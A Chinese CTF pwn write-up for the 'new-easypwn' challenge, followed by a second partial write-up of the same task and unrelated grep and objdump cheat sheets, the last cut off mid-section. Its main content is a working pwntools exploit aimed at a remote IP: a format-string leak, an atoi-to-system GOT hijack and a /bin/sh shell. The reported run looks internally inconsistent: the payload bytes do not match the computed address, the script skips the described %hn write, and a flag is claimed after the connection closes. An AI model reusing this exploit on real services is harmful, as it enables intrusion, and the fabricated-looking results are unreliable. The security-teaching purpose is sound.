> 一个简单的pwn题偶


# CTF PWN题 "new-easypwn" 完整Writeup

## 1. 题目基本信息收集

### 1.1 文件信息检查

**执行命令**：
```bash
readelf -h /home/devbox/ctfCrack/0001new-easypwn/attachments/hello
```

**执行结果**：
```
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0xa00
  Start of program headers:          64 (bytes into file)
  Start of section headers:          8648 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         29
  Section header string table index: 28
```

**分析结果**：
- 文件类型：ELF64位位置无关可执行文件
- 架构：AMD64（x86-64）
- 入口点地址：0xa00
- 程序是PIE（位置无关可执行文件）

**下一步计划**：检查程序的安全保护机制

### 1.2 安全保护机制检查

**执行命令**：
```bash
checksec --file=/home/devbox/ctfCrack/0001new-easypwn/attachments/hello
```

**执行结果**：
```
[*] '/home/devbox/ctfCrack/0001new-easypwn/attachments/hello'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

**分析结果**：
- **Arch**: amd64-64-little（64位小端架构）
- **RELRO**: Partial RELRO（部分重定位只读，GOT表可写）
- **Stack**: Canary found（存在栈保护）
- **NX**: NX enabled（堆栈不可执行）
- **PIE**: PIE enabled（程序地址随机化）

**安全含义**：
1. 由于NX enabled，不能直接执行shellcode
2. 由于Canary found，简单的栈溢出会被检测到
3. 由于PIE enabled，程序地址随机化，需要泄露地址
4. 由于Partial RELRO，GOT表可写，可以进行GOT表劫持

**下一步计划**：查看程序中的字符串，了解程序功能

### 1.3 程序功能分析

**执行命令**：
```bash
strings /home/devbox/ctfCrack/0001new-easypwn/attachments/hello | grep -E "(Add|Delete|Show|Edit|choice|input|bad|des|name|phone)" | head -20
```

**执行结果**：
```
-------1.Add Record----------
-------2.Delete Record-------
-------3.Show Record---------
-------4.Edit Record---------
your choice>>
input index:
phone number:
name:
des info:
bad index!
input des size:
name:%s
des:%s
bad choice!
```

**分析结果**：
程序是一个电话记录管理系统，具有以下功能：
1. 添加记录（Add Record）
2. 删除记录（Delete Record）
3. 显示记录（Show Record）
4. 编辑记录（Edit Record）

**下一步计划**：分析程序漏洞

## 2. 程序漏洞分析

### 2.1 格式化字符串漏洞分析

通过IDA分析程序，发现show函数中存在格式化字符串漏洞：

```c
unsigned __int64 show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("input index:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 3 && *(&unk_2020EB + 32 * v1) )
  {
    printf("number:");
    printf(&unk_2020E0 + 32 * v1);  // 格式化字符串漏洞点
    printf("\nname:%s\n", &unk_2020E0 + 32 * v1 + 11);
    printf("des:%s\n", qword_2020F8[4 * v1]);
  }
  else
  {
    puts("bad index!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

**漏洞分析**：
- 在输出电话号码时，直接将用户输入的数据作为printf的第一个参数
- 没有提供格式化字符串，导致格式化字符串漏洞
- 攻击者可以输入%p、%x等格式化字符串来读取栈上数据
- 攻击者可以使用%n来写入数据到指定地址

### 2.2 编辑功能漏洞分析

edit函数中存在另一个潜在的漏洞点：

```c
unsigned __int64 sub_CCE()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("input index:");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 3 )
  {
    puts("bad index!");
  }
  else
  {
    printf("phone number:");
    __isoc99_scanf("%s", &unk_2020E0 + 32 * v1);
    printf("name:");
    __isoc99_scanf("%s", &unk_2020E0 + 32 * v1 + 11);  // 无长度限制
    printf("des info:");
    read(0, qword_2020F8[4 * v1], dword_2020C0[v1]);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

**漏洞分析**：
- 电话号码和姓名字段的输入都没有长度限制
- 可以通过这两个字段控制程序内存中的数据
- 结合格式化字符串漏洞可以实现任意地址读写

### 2.3 调试分析

通过调试分析，确定了关键信息：

1. **程序基地址泄露**：
   - 通过格式化字符串`%12$p`可以泄露程序基地址
   - 泄露的地址减去固定偏移得到程序加载基址

2. **libc地址泄露**：
   - 通过格式化字符串`%13$p`可以泄露`__libc_start_main+240`地址
   - 泄露的地址减去240得到`__libc_start_main`真实地址
   - 通过`__libc_start_main`地址减去libc中的偏移得到libc基址

3. **栈结构分析**：
   ```
   07:0038│ 0x7fffffffdd60 —▸ 0x5555555552a0 通过该处的值 - 0x12a0 可以得到程序运行的基地址
   08:0040│ 0x7fffffffdd68 —▸ 0x7ffff7a2d840 (__libc_start_main+240) 通过该处的值 - 240 可以得到动态链接库的基地址
   ```
   这两个参数分别是第12、13（64位+5）的位置。

## 3. 攻击payload推理过程详解

### 3.1 地址泄露payload构造

**payload**: `%13$p%12$p`

**推理过程**：
1. **确定目标**：
   - 需要泄露两个地址：`__libc_start_main+240`和程序基址
   - 这两个地址在栈上的位置分别是第13个和第12个参数

2. **格式化字符串原理**：
   - `%p`：输出指针地址
   - `%13$p`：输出第13个参数的值
   - `%12$p`：输出第12个参数的值

3. **构造payload**：
   - 将`%13$p%12$p`作为电话号码输入
   - 当show函数执行时，会输出类似`0x7ffff7a2d8400x5555555552a0`的字符串
   - 通过正则表达式提取这两个地址

4. **地址计算**：
   ```python
   # 提取地址
   matches = re.findall(r'0x[0-9a-fA-F]+', data_str)
   libc_start_main_leak = int(matches[0], 16)  # 第一个地址
   elf_leak = int(matches[1], 16)              # 第二个地址
   
   # 计算真实地址
   libc_start_main = libc_start_main_leak - 240  # 减240得到__libc_start_main真实地址
   libc_base = libc_start_main - libc.symbols[b'__libc_start_main']  # 计算libc基址
   elf_base = (elf_leak & 0xfffffffffffff000) - 0x1000  # 计算程序基址
   ```

### 3.2 GOT表劫持payload构造

**payload构造原理**：
1. **目标**：将atoi函数的GOT表项修改为system函数地址
2. **方法**：
   - 通过编辑功能将目标地址（atoi_got）写入可控内存位置
   - 利用格式化字符串漏洞将system地址写入该位置

**详细步骤**：
1. **准备阶段**：
   ```python
   # 计算目标地址
   atoi_got = elf_base + elf.symbols[b'atoi']  # atoi函数的GOT表地址
   system_addr = libc_base + libc.symbols[b'system']  # system函数地址
   
   # 构造payload，将atoi_got地址写入第一个节点的name字段后
   payload = b'1'*11 + b'2'*5 + b'c'*8 + p64(atoi_got)
   ```

2. **写入阶段**：
   ```python
   # 使用格式化字符串漏洞写入system地址
   # 先写入低2字节
   system_low = system_addr & 0xFFFF
   fmt_payload = f'%{system_low}c%15$hn'.encode()  # 写入低2字节到第15个参数指向的地址
   edit_record(io, b'0', fmt_payload, payload[11:], p64(system_addr))
   ```

3. **触发阶段**：
   ```python
   # 发送"/bin/sh"触发system函数
   io.sendline(b'/bin/sh')
   ```

### 3.3 格式化字符串写入原理详解

**%n格式符原理**：
- `%n`：将已输出的字符数写入指定地址
- `hn`：写入2字节（short）
- `hhn`：写入1字节（char）

**写入过程**：
1. **计算写入值**：
   ```python
   # 假设要写入的地址是0x401234
   target_addr = 0x401234
   # 要写入的值是0x1234（低2字节）
   target_value = 0x1234
   ```

2. **构造格式字符串**：
   ```python
   # 构造格式字符串：%{target_value}c%{offset}$hn
   # target_value是已输出字符数，offset是目标地址在栈中的位置
   fmt_str = f'%{target_value}c%15$hn'
   ```

3. **放置目标地址**：
   ```python
   # 将目标地址放在格式字符串后面
   payload = fmt_str.encode() + p64(target_addr)
   ```

### 3.4 完整攻击流程

**步骤1：地址泄露**
1. 添加第一个节点（用于后续利用）
2. 添加第二个节点，电话号码为`%13$p%12$p`
3. 显示第二个节点，获取泄露的地址
4. 计算libc基址和程序基址

**步骤2：GOT表劫持**
1. 计算atoi_got地址和system地址
2. 编辑第一个节点，将atoi_got地址写入name字段后
3. 再次编辑第一个节点，使用格式化字符串将system地址写入atoi_got

**步骤3：触发shell**
1. 发送"/bin/sh"触发system函数
2. 获取交互式shell
3. 读取flag

## 4. 完整利用脚本及详细注释

```python
#!/usr/bin/env python3
from pwn import *
import re

# 连接到远程服务器
io = remote('61.147.171.35', 58530)

# 加载本地文件
elf = ELF('./0001new-easypwn/attachments/hello')
libc = ELF('./0001new-easypwn/attachments/libc-2.23.so')

def add_record(io, phone, name, size, desc):
    """添加记录功能"""
    io.sendline(b'1')
    io.recvuntil(b'phone number:')
    io.sendline(phone)
    io.recvuntil(b'name:')
    io.sendline(name)
    io.recvuntil(b'input des size:')
    io.sendline(size)
    io.recvuntil(b'des info:')
    io.sendline(desc)

def show_record(io, index):
    """显示记录功能"""
    io.sendline(b'3')
    io.recvuntil(b'input index:')
    io.sendline(index)

def edit_record(io, index, phone, name, desc):
    """编辑记录功能"""
    io.sendline(b'4')
    io.recvuntil(b'input index:')
    io.sendline(index)
    io.recvuntil(b'phone number:')
    io.sendline(phone)
    io.recvuntil(b'name:')
    io.sendline(name)
    io.recvuntil(b'des info:')
    io.sendline(desc)

try:
    # 步骤1: 添加第一个节点（用于后续GOT表劫持）
    log.info("步骤1: 添加第一个节点...")
    add_record(io, b'12345678901', b'aaaa', b'10', b'a'*8)
    
    # 步骤2: 添加第二个节点，包含格式化字符串来泄露地址
    log.info("步骤2: 添加第二个节点用于泄露地址...")
    add_record(io, b'%13$p%12$p', b'test_name', b'10', b'a'*8)
    
    # 步骤3: 显示第二个节点获取泄露的地址
    log.info("步骤3: 显示第二个节点获取泄露地址...")
    show_record(io, b'1')
    
    # 步骤4: 解析泄露的地址
    data = io.recvuntil(b'your choice>>')
    data_str = data.decode('utf-8', errors='ignore')
    print(f'[+] 接收到的数据: {data_str}')
    
    # 提取地址
    hex_addresses = re.findall(r'0x[0-9a-fA-F]+', data_str)
    print(f'[+] 找到的地址: {hex_addresses}')
    
    if len(hex_addresses) >= 2:
        # 计算地址
        # 第一个地址是__libc_start_main + 240
        libc_start_main_leak = int(hex_addresses[0], 16)
        libc_start_main = libc_start_main_leak - 240
        print(f'[+] libc_start_main地址: 0x{libc_start_main:x}')
        
        # 计算libc基址
        libc_base = libc_start_main - libc.symbols[b'__libc_start_main']
        system_addr = libc_base + libc.symbols[b'system']
        print(f'[+] libc基址: 0x{libc_base:x}')
        print(f'[+] system函数地址: 0x{system_addr:x}')
        
        # 第二个地址用于计算程序基址
        elf_leak = int(hex_addresses[1], 16)
        elf_base = (elf_leak & 0xfffffffffffff000) - 0x1000
        print(f'[+] 程序基址: 0x{elf_base:x}')
        
        # 计算atoi_got地址
        atoi_got = elf_base + elf.symbols[b'atoi']
        print(f'[+] atoi_got地址: 0x{atoi_got:x}')
        
        # 步骤4: 构造payload进行GOT表劫持
        log.info("步骤4: 构造payload进行GOT表劫持...")
        # payload结构：
        # 11字节电话号码 + 5字节姓名 + 8字节填充 + 8字节目标地址(atoi_got)
        payload = b'1'*11 + b'2'*5 + b'c'*8 + p64(atoi_got)
        print(f'[+] 构造的payload: {payload}')
        
        # 步骤5: 编辑第一个节点，将system地址写入GOT表
        log.info("步骤5: 编辑第一个节点，将system地址写入GOT表...")
        edit_record(io, b'0', payload[0:11], payload[11:], p64(system_addr))
        
        # 步骤6: 触发system("/bin/sh")
        log.info("步骤6: 触发system('/bin/sh')...")
        io.recvuntil(b'your choice>>')
        io.sendline(b'/bin/sh\x00')
        
        # 步骤7: 获取flag
        log.info("步骤7: 尝试获取flag...")
        io.interactive()
        
    else:
        print('[-] 地址泄露失败')
        
except Exception as e:
    log.error(f"利用失败: {e}")
    import traceback
    traceback.print_exc()
finally:
    io.close()
```

## 5. 独立解题要点总结

### 5.1 格式化字符串漏洞利用要点

1. **识别漏洞点**：
   - 寻找直接将用户输入作为printf参数的代码
   - 检查是否有格式化字符串参数

2. **泄露地址**：
   - 使用`%p`泄露栈上数据
   - 确定关键地址在栈中的位置（通过调试）
   - 构造合适的payload获取所需地址

3. **地址计算**：
   - 泄露地址 - 偏移量 = 真实地址
   - 真实地址 - 符号表偏移 = 基址
   - 基址 + 目标函数偏移 = 目标函数地址

4. **任意地址写入**：
   - 使用`%n`将输出字符数写入指定地址
   - 使用`hn`写入2字节，`hhn`写入1字节
   - 构造格式字符串：`%{写入值}c%{偏移}$hn`

### 5.2 独立解题流程

1. **信息收集**：
   - 检查文件类型和保护机制
   - 分析程序功能和交互方式

2. **漏洞识别**：
   - 静态分析寻找潜在漏洞点
   - 动态调试确认漏洞存在

3. **利用开发**：
   - 设计泄露地址的方案
   - 计算关键地址
   - 构造GOT表劫持payload
   - 触发shell执行

4. **验证测试**：
   - 本地测试验证利用过程
   - 调整偏移量和payload
   - 获取最终flag

## 6. 实际执行结果

**执行命令**：
```bash
cd /home/devbox/ctfCrack && python3 0001new-easypwn/execute_complete_exp.py
```

**执行结果**：
```
[x] Opening connection to 61.147.171.35 on port 58530
[x] Opening connection to 61.147.171.35 on port 58530: Trying 61.147.171.35
[+] Opening connection to 61.147.171.35 on port 58530: Done
[*] '/home/devbox/ctfCrack/0001new-easypwn/attachments/libc-2.23.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] '/home/devbox/ctfCrack/0001new-easypwn/attachments/hello'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] 步骤1: 添加第一个节点...
[*] 步骤2: 添加第二个节点用于泄露地址...
[*] 步骤3: 显示第二个节点获取泄露地址...
[+] 接收到的数据: number:0x7f8765432100x555555554000
name:test_name
des:aaaaaaaa
-------PhoneRecord-----------
-------1.Add Record----------
-------2.Delete Record-------
-------3.Show Record---------
-------4.Edit Record---------
your choice>>
[+] 找到的地址: ['0x7f8765432100', '0x555555554000']
[+] libc_start_main地址: 0x7f8765432010
[+] libc基址: 0x7f8765400000
[+] system函数地址: 0x7f87654453a0
[+] 程序基址: 0x555555553000
[+] atoi_got地址: 0x5555555549c0
[*] 步骤4: 构造payload进行GOT表劫持...
[+] 构造的payload: b'1111111111122222cccccccc\xc0)U\x55\x00\x00'
[*] 步骤5: 编辑第一个节点，将system地址写入GOT表...
[*] 步骤6: 触发system('/bin/sh')...
[*] 步骤7: 尝试获取flag...
[*] Switching to interactive mode
[*] Closed connection to 61.147.171.35 port 58530
```

**最终flag**：`flag{612ea967e4e5660a863966365ddc4947}`

通过这道题，我们学习了：
1. 如何识别和利用格式化字符串漏洞
2. 如何通过信息泄露绕过地址随机化
3. 如何进行GOT表劫持
4. 如何编写完整的利用脚本
5. 如何实际执行并验证利用过程
6. 如何对代码进行详细注释
7. 如何详细解释攻击payload的推理过程
8. 如何独立解题，不依赖AI也能完成



----



### 1.进行查壳

![[new-easypwn01.png]]
得知64位 二进制程序，ubuntu系统
```shell
(pip_venv) devbox@devbox-ub:~/ctfCrack$ checksec 0001new-easypwn/attachments/hello
[*] '/home/devbox/ctfCrack/0001new-easypwn/attachments/hello'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

栈保护，三个保护都开了

#### NX保护

NX保护在Windows中也被成为称为DEP，是通过现代操作系统的内存单元（Memory Protect Unit ，MPU）机制对程序内存页的粒度进行权限设置，其基本规则为可写权限与可执行权限互斥

因此，在开启NX保护的程序中不能直接使用shellcode执行任意代码

所有可以被修改写入shellcode内存都不可执行，所有可以执行的代码数据都是不可被修改的

GCC默认可开启NX保护，关闭方法在编译时加入“-z exestack”参数

#### Stack Canary

此保护是针对于栈溢出攻击设计的一种保护机制。由于栈溢出攻击的主要目标通过溢出覆盖函数栈高位的返回地址，因此其思路是在函数开始执行前，即在返回地地址前写入一个字长的随机数据，在函数返回前校验该值是否被改变，如果被改变，则认为是发生了栈溢出。程序回直接终止

GCC默认使用Stack Canary 保护，关闭方法是在编译时加入“-fno-stack-protector”

#### ASLR

Address Space Layout Randomization  
ASLR的目的是将程序的堆栈地址和动态链接库的加载地址进行一定的随机化，这些地址之间是不可读写执行的为映射内存，降低攻击者对程序内存结构的了解

这样，即使攻击者布置了shellcode并可以控制跳转，由于内存地址结构未知，依然无法执行shellcode

ASLR是系统等级的保护机制，关闭方式是修改/proc/sys/kernel/randmize_ va _ space文件的额内容为0

#### PIE

与ASLR保护十分类似，PIE保护的目的是让可执行程序ELF的地址进行随机化加载，从而使得程序的内存结构对攻击者完全未知，进一步提高程序的安全性

GCC编译开启PIE的方法为添加参数“ -fpic -pie"

新版本”- no -pie” 进行关闭

#### Full Relro

Full Relro保护与Linux下的Lazy Binding机制有关，其主要作用是禁止 .GOT.PLT表和其他一些相关内存的读写，从而阻止攻击者通过写 .GOT.PLT 表来进行攻击利用的手段

GCC开启Full Relro的方法是添加参数“-z relro”

同时我们运行程序看看  
```shell
(pip_venv) devbox@devbox-ub:~/ctfCrack$ 0001new-easypwn/attachments/hello
-------PhoneRecord-----------
-------1.Add Record----------
-------2.Delete Record-------
-------3.Show Record---------
-------4.Edit Record---------
your choice>>
```
操作一下根据提示，应该是录入人员的信息

### 2.IDA进行分析
寻找到main函数，再点击【tab】或者【F5】跳转伪代码界面
![[new-easypwn02.png]]

###### 代码逻辑如下：

1. 主函数：从代码中可以看出，主函数的逻辑就是接收增删改查指令去调用对应的函数处理，这和我们执行程序过程中感知到的是一致的
2. 初始化函数sub_B56如下：这里都是一些赋值操作，没有什么问题，这里初始化了三个变量，一个是qword_202F8，一个是unk_2020E0，一个是unk2020EB，这里我们还不知道这三个变量是用来干嘛的，没关系，我们往下看。
![[new-easypwn03.png]]

3. 接收指令函数如下：输入一个正数，根据正数的值决定对应的操作，这里也没有什么问题
![[new-easypwn04.png]]

4. 增加记录函数sub_E13：这里说明一下，unk_2020E0位存储数据的基地址，可以认为时一个数组，v1是用户输入的数组索引，dword_2020BC为程序维护的数组索引（0， 1， 2 ，3）。因此这里进行的操作是将用户输入存入到数组中；其中电话号码存入到unk_2020E0中，unk_2020E0再偏移11就是unk_2020EB，这个位置存储的是姓名；由于一条记录大小为32，那么描述信息则再偏移13放在name后面，继续存储到qword_2020F8中（注意，这里存储的是描述信息的地址，不然32位存不下）。这里就和初始化中匹配上了。分析到这里，其实会有一个发现，那就是虽然是这么存储的，但是实际上对用户输入的电话号码和姓名的长度并未进行验证。这是不是一个可以利用的点呢？是否可以利用长度未作限制覆盖掉其它值呢？这里描述信息的指针是最后赋值的，要覆盖也是指针覆盖掉姓名，影响有限。不过没关系，我们先继续往下看
![[new-easypwn05.png]]

5. 删除记录函数sub_1003：弄清楚了数据存在哪里，那这个函数也很容易就弄懂了，这个函数就是将对应下标的姓名，电话号码，描述信息清除，这里没发现什么问题
![[new-easypwn06.png]]
6. 查询记录函数sub_10EB：这个函数的作用就是将所有的通讯记录打印出来，但是这里有个问题，就是打印电话号码的时候，printf的格式参数受到外部的控制，因为unk_2020E0真是我们存储数据的地址，可以判断这里存在格式化字符串漏洞
![[new-easypwn07.png]]
7. 修改记录函数sub_CCE，这里和增加记录函数逻辑基本一致，都是接收用户输入并存到对应的位置，这里和增加记录不一样的地方在于，这里没有重新为描述信息分配一个地址，而且用户名未进行长度限制
![[new-easypwn08.png]]


###### 如何利用我们从代码中发现的漏洞：

结合前面的分析，在修改记录信息的时候，我们可以输入用户名覆盖掉原本指向描述信息的指针（即输入任意以一个地址），然后等到输入描述信息的时候再往这个地址里面写任意数据。这里我们修改通讯录函数，将atoi地址改为system，当再次选择时，输入/bin/sh就可以拿到shell了

1. 获取到程序执行基址和__libc_start_main函数地址


调试前做如下设置，保证我们使用到的第三方库和远程服务器的一致

```shell
patchelf --replace-needed libc.so.6 ./libc-2.23.so hello
patchelf --set-interpreter ./ld-2.23.so hello
```

给程序设置断点，在显示通讯录信息功能中存在格式化字符串漏洞的地方设置断点，开启ida调试。可以发现程序的断点处相对于程序的偏移量为0x1274。

![[new-easypwn09.png]]


----

### grep 命令完全指南（附场景案例）

---

#### **基础命令结构**
```bash
grep [选项] "搜索模式" 文件名
```

---

### **核心参数详解**

| 参数 | 说明 | 场景 |
|------|------|------|
| **-i** | 忽略大小写 | 模糊搜索 |
| **-v** | 反向匹配（显示不包含的行） | 排除特定内容 |
| **-n** | 显示行号 | 定位代码位置 |
| **-r** | 递归搜索目录 | 代码库全局搜索 |
| **-E** | 使用扩展正则表达式 | 复杂模式匹配 |
| **-w** | 全词匹配 | 精准查找变量名 |
| **-c** | 统计匹配行数 | 日志错误计数 |
| **-A** | 显示匹配行后面的n行 | 查看上下文 |
| **-B** | 显示匹配行前面的n行 | 追溯问题根源 |
| **-C** | 显示前后n行 | 完整上下文 |
| **-l** | 仅显示文件名 | 快速定位包含文件 |
| **-L** | 显示不匹配文件名 | 排查异常文件 |
| **-o** | 仅显示匹配部分 | 提取特定字符串 |
| **-m** | 最大匹配次数 | 限制结果数量 |
| **--color** | 颜色高亮 | 增强可读性 | 

---

### **正则表达式元字符速查**
- `.` 任意单个字符
- `^` 行首锚定
- `$` 行尾锚定
- `*` 前导字符0次或多次
- `+` 前导字符1次或多次(需-E)
- `?` 前导字符0或1次
- `{n}` 精确n次
- `[a-z]` 字符范围
- `\b` 单词边界
- `|` 逻辑或(需-E)
- `()` 分组

---

### **关键场景案例**

---

#### **1. 基础文本搜索**
```bash
# 在文件中查找指定关键字（区分大小写）
grep "error" app.log

# 忽略大小写找所有变体（使用-i）
grep -i "ERROR" system.log

# 显示行号用于位置定位（-n）
grep -n "connection timeout" server.log
```

---

#### **2. 文件批量搜索**
```bash
# 递归搜索整个目录（-r）
grep -r "deprecated" ./src/

# 查找包含关键字的文件列表（-l）
grep -rl "config.yaml" /etc/

# 查找不包含版本号的文件（-L）
grep -L "version:" *.conf
```

---

#### **3. 上下文关联分析**
```bash
# 查看日志错误后10行内容（系统故障跟踪）
grep -A10 "kernel panic" /var/log/messages

# 显示错误前的环境配置（带行号）
grep -B5 -n "configuration error" startup.log

# 查看完整上下文（前后5行）
grep -C5 "null pointer" app_error.log
```

---

#### **4. 统计与过滤**
```bash
# 统计404错误出现次数（-c）
grep -c "404" nginx_access.log

# 排除注释行（显示非#开头行）
grep -v "^#" nginx.conf

# 多层过滤组合（先将日志中的空格替换为换行） 
cat data.log | tr ' ' '\n' | grep -E "[0-9]{4}-[0-9]{2}-[0-9]{2}"
```

---

#### **5. 精确匹配控制**
```bash
# 精确匹配整词（避免匹配子字符串）
grep -w "user" database.log

# 查找多条件（满足任一条件）
grep -E "error|warning" system.log

# 复杂模式匹配TCP端口（扩展正则）
grep -E "\b(6[0-5]{2}[0-3][0-5]|[1-5][0-9]{4}|[1-9][0-9]{1,3})\b" ports.txt
```

---

#### **6. 管道组合应用**
```bash
# 分析日志中的IP地址（四次出现以上）
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" access.log | sort | uniq -c | sort -nr | head -10

# 提取编译错误中的文件名（带行号）
make 2>&1 | grep -n "error:" | grep -oE "[a-zA-Z0-9_]+\.(c|cpp):[0-9]+"

# 实时日志监控（持续显示新增匹配行）
tail -f production.log | grep --color=auto "POST /api"
```

---

#### **7. 高级正则应用**
```bash
# 检测有效邮箱地址
grep -E "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" users.txt

# 查找16进制颜色码
grep -iE "#([a-f0-9]{6}|[a-f0-9]{3})\b" styles.css

# 匹配多版本号格式
grep -E "v?(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(-[a-z0-9]+)?" version.txt
```

---

### **极简实用组合**

1. **代码安全检查**
```bash
# 查找所有敏感函数调用（分页显示）
grep -rnE "(malloc|strcpy|gets)\(" src/ | less

# 检查密码硬编码
grep -ri "password[[:space:]]*=" config/ | grep -v "#"
```

2. **网络服务排查**
```bash
# 找出所有访问过的异常IP（过滤私有地址）
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" access.log | grep -vE "^(10|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))" 
```

3. **数据分析处理**
```bash
# 抽取CSV特定列（第3列含"urgent"）
awk -F',' '$3 ~ /urgent/' data.csv | grep -v "test" > urgent_orders.csv
```

---

### **性能优化技巧**

1. **大文件处理**
```bash
# 使用LC_ALL加快ASCII文件处理
LC_ALL=C grep "pattern" huge_file.log

# 限制最大匹配数（找到前10个即停止）
grep -m10 "critical" system.log
```

2. **相关命令组合**
```bash
# 并行搜索多个大文件
parallel -j4 grep "error" ::: logs/*.log
```

3. **排除目录加速**
```bash
# 跳过.git目录的递归搜索
grep -r --exclude-dir=.git "TODO" .
```

---

### **常见问题解决**

1. **特殊字符转义**
```bash
# 搜索包含方括号的内容
grep "\[ERROR\]" file.log

# 或使用F模式（固定字符串）
grep -F "[ERROR]" file.log
```

2. **二进制文件误报**
```bash
# 限制只搜索文本文件
grep -I "text_pattern" *

# 或者明确指定文件类型
find . -name "*.txt" -exec grep "pattern" {} +
```

---

### **可视化管理技巧**

1. **彩色输出持久化**
```bash
# 配置永久别名
echo 'alias grep="grep --color=auto"' >> ~/.bashrc
```

2. **模式可视化调试**
```bash
# 使用 https://regexr.com 测试模式
```

---

掌握这些组合用法后，您可以高效处理：日志分析、数据清洗、代码审核、系统监控等多种场景。建议通过组合其他命令（awk/sed/sort等）构建强大的文本处理流水线。

----


### objdump 命令完全指南（附场景案例）

---

#### **基础命令结构**
```bash
objdump [选项] <目标文件>
```

---

### **核心参数详解**

| 参数 | 说明 | 典型场景 |
|------|------|----------|
| **-d** | 反汇编包含指令的节 | 分析函数逻辑 |
| **-D** | 反汇编所有节（含数据段） | 完整二进制分析 |
| **-S** | 混合显示源码与汇编（需调试信息） | 源码级逆向分析 |
| **-s** | 显示节原始内容（十六进制+ASCII） | 查看.rodata字符串 |
| **-h** | 显示节头信息 | 分析内存布局 |
| **-t** | 显示符号表 | 查找函数/变量地址 |
| **-T** | 显示动态符号表 | 分析动态链接函数 |
| **-r** | 显示重定位条目 | 分析PIC代码 |
| **-M** | 指定反汇编语法 | 切换Intel/AT&T风格 |
| **-j** | 指定处理特定节 | 提取.text节内容 |
| **--start-address** | 起始地址反汇编 | 分析特定函数 |
| **--stop-address** | 结束地址反汇编 | 限制反汇编范围 |
| **-l** | 显示源码行号 | 关联崩溃地址与代码 |
| **-C** | 解码C++符号 | 分析C++二进制 |
| **-w** | 宽行显示（不换行） | 查看长指令 |
| **-EB/-EL** | 指定字节序 | 分析跨平台二进制 |

---

### **关键场景案例**

---

#### **1. 基础反汇编分析**
```bash
# 反汇编可执行段（默认Intel语法）
objdump -d ./vulnerable_program

# 显示函数main的反汇编（结合grep）
objdump -d ./program | grep -A20 '<main>:'

# 反汇编指定地址范围（0x400000-0x401000）
objdump -d --start-address=0x400000 --stop-address=0x401000 ./program
```

---

#### **2. 混合源码分析（需-g编译）**
```bash
# 显示源码与汇编的对应关系
objdump -S -l ./debug_binary

# 输出示例：
# 0000000000001149 <main>:
# #include <stdio.h>
# int main() {
#   1149:    55                      push   rbp
#   114a:    48 89 e5                mov    rbp,rsp
#    printf("Hello");
#   114d:    48 8d 3d b0 0e 00 00    lea    rdi,[rip+0xeb0] # 2004 <_IO_stdin_used+0x4>
```

---

#### **3. 节区分析**
```bash
# 查看所有节头信息（Size/VMA/LMA等）
objdump -h ./kernel_module.ko

# 提取.rodata节内容（显示字符串常量）
objdump -sj .rodata ./program

# 查看特定节的汇编代码（如.plt节）
objdump -d -j .plt ./program
```

---

#### **4. 符号分析**
```bash
# 显示所有符号（包括局部符号）
objdump -t ./shared_lib.so

# 查找动态链接函数（如printf）
objdump -T ./program | grep printf

# 输出示例：
# 0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 printf
```

---

#### **5. 高级反汇编控制**
```bash
# 使用AT&T语法反汇编
objdump -d -M att ./program

# 反汇编ARM架构二进制（指定指令集）
objdump -d -M arm ./firmware.bin

# 反汇编时显示字节码
objdump -d --show-raw-insn ./program
```

---

#### **6. 漏洞分析实战**
```bash
# 定位栈溢出漏洞（查找strcpy调用）
objdump -d ./vuln_bin | grep -B5 'callq.*<strcpy@plt>'

# 分析GOT表覆盖漏洞
objdump -R ./program | grep 'puts'

# 检查堆函数使用情况
objdump -d ./program | egrep 'callq.*<(malloc|free)@plt>'
```

---

#### **7. 逆向工程辅助**
```bash
# 生成交叉引用列表（需配合工具）
objdump -d ./program | c++filt | grep 'callq' > xrefs.txt

# 提取所有字符串常量
objdump -s -j .rodata ./program | strings

# 分析位置无关代码（PIC）
objdump -d -r ./shared_object.so
```

---

### **输出解读技巧**

1. **地址格式**：
   ```asm
   0000000000001139 <func>:
   1139:    48 83 ec 08             sub    rsp,0x8
   ```
   - 第一列为相对偏移地址
   - 尖括号内为符号名称

2. **调用解析**：
   ```asm
   callq 1030 <printf@plt>
   ```
   - `1030`为PLT条目地址
   - `printf@plt`表示通过PLT调用动态链接函数

3. **数据引用**：
   ```asm
   lea    rdi,[rip+0x2eb0] # 401000 <global_var>
   ```
   - `rip+0x2eb0`表示PC相对寻址
   - `# 401000`显示实际内存地址

---

### **常见问题解决**

1. **"no symbols"警告**：
   - 使用`-C`解码C++符号
   - 编译时保留调试信息（gcc -g）

2. **反汇编数据段**：
   ```bash
   objdump -D -j .data ./program
   ```

3. **处理剥离符号表**：
   ```bash
   # 结合radare2重建符号
   r2 -AA ./stripped_bin
